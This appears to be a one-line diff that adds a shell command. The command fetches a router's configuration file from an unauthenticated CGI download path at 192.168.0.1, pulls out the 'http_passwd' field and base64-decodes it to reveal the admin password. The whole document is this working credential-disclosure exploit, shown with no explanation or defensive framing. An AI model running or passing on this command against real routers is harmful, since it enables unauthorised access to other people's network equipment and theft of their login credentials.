@@ -1,0 +1,1 @@
+curl -q -s http://192.168.0.1:80/cgi-bin/DownloadCfg/RouterCfm.cfg -A '' -H 'Accept:' -H 'Host:' | grep 'http_passwd=' | awk -F'=' '{print $2}' | tr -d '\r\n'| base64 -d ; echo
